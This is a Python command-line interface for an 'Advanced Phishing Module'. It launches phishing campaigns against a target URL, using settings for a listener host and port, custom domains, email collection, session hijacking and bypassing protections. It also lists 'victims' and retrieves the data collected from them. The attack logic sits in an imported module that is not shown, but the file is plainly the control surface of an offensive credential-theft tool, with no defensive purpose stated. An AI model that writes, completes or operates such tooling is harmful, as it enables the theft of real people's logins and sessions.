#!/usr/bin/env python3
"""
Advanced Phishing Module CLI
Command Line Interface for Advanced Phishing Module
"""

import asyncio
import argparse
import json
import sys
from advanced_phishing_module import AdvancedPhishingModule, PhishingConfig

async def main():
    parser = argparse.ArgumentParser(description='Advanced Phishing Module CLI')
    parser.add_argument('--create-campaign', action='store_true', help='Create phishing campaign')
    parser.add_argument('--config', help='Phishing configuration (JSON)')
    parser.add_argument('--tool', default='auto', help='Phishing tool to use')
    parser.add_argument('--get-campaigns', action='store_true', help='Get all campaigns')
    parser.add_argument('--get-victims', action='store_true', help='Get campaign victims')
    parser.add_argument('--campaign-id', help='Campaign ID')
    parser.add_argument('--stop-campaign', help='Stop campaign by ID')
    parser.add_argument('--get-collected-data', action='store_true', help='Get collected data')
    parser.add_argument('--statistics', action='store_true', help='Get statistics')
    
    args = parser.parse_args()
    
    phishing_module = AdvancedPhishingModule()
    
    try:
        if args.create_campaign:
            if not args.config:
                print(json.dumps({"success": False, "error": "Phishing configuration is required"}))
                return
            
            try:
                config_data = json.loads(args.config)
                config = PhishingConfig(
                    target_url=config_data.get('target_url', ''),
                    phishing_type=config_data.get('phishing_type', ''),
                    template=config_data.get('template', 'default'),
                    lhost=config_data.get('lhost', ''),
                    lport=config_data.get('lport', 8080),
                    ssl_cert=config_data.get('ssl_cert', False),
                    custom_domain=config_data.get('custom_domain', ''),
                    email_collection=config_data.get('email_collection', True),
                    session_hijacking=config_data.get('session_hijacking', True),
                    bypass_protection=config_data.get('bypass_protection', False),
                    custom_options=config_data.get('custom_options', {})
                )
            except json.JSONDecodeError:
                print(json.dumps({"success": False, "error": "Invalid configuration JSON"}))
                return
            
            result = await phishing_module.create_phishing_campaign(config, args.tool)
            print(json.dumps(result))
            
        elif args.get_campaigns:
            result = phishing_module.get_all_campaigns()
            print(json.dumps(result))
            
        elif args.get_victims:
            if not args.campaign_id:
                print(json.dumps({"success": False, "error": "Campaign ID is required"}))
                return
            
            result = await phishing_module.get_campaign_victims(args.campaign_id)
            print(json.dumps(result))
            
        elif args.stop_campaign:
            if not args.stop_campaign:
                print(json.dumps({"success": False, "error": "Campaign ID is required"}))
                return
            
            result = await phishing_module.stop_campaign(args.stop_campaign)
            print(json.dumps(result))
            
        elif args.get_collected_data:
            if not args.campaign_id:
                print(json.dumps({"success": False, "error": "Campaign ID is required"}))
                return
            
            result = await phishing_module.get_collected_data(args.campaign_id)
            print(json.dumps(result))
            
        elif args.statistics:
            result = phishing_module.get_statistics()
            print(json.dumps(result))
            
        else:
            parser.print_help()
            
    except Exception as e:
        print(json.dumps({"success": False, "error": str(e)}))

if __name__ == "__main__":
    asyncio.run(main())